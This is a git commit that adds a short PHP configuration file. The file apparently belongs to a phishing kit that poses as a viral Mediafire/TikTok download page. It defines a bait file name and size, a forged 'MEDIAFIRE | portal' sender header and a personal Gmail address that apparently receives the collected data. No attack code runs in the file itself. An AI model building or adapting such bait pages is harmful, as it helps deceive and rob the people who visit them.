bff049699f9fbd722a7f637d95ba2356056af7d1
Candra2222 <84482710+Candra2222@users.noreply.github.com>
2023-11-18 11:26:37 +0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,13 @@
+<?php
+
+$linkweb = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+$link = 'https://www.youtube.com/results?search_query=mediaf%C4%B1re+viral';
+$namafile = 'MEDIAFIRE VIRAL TIKTOK'; //Ganti Nama Mediafire Disini
+$ukuranfile = '4.2MB'; //KB MB GB TB
+
+$sender = 'From: MEDIAFIRE | portal || <SINCE2020@xx.com>';
+$emailku = 'erorgaming180998@gmail.com';
+
+
+
+?>
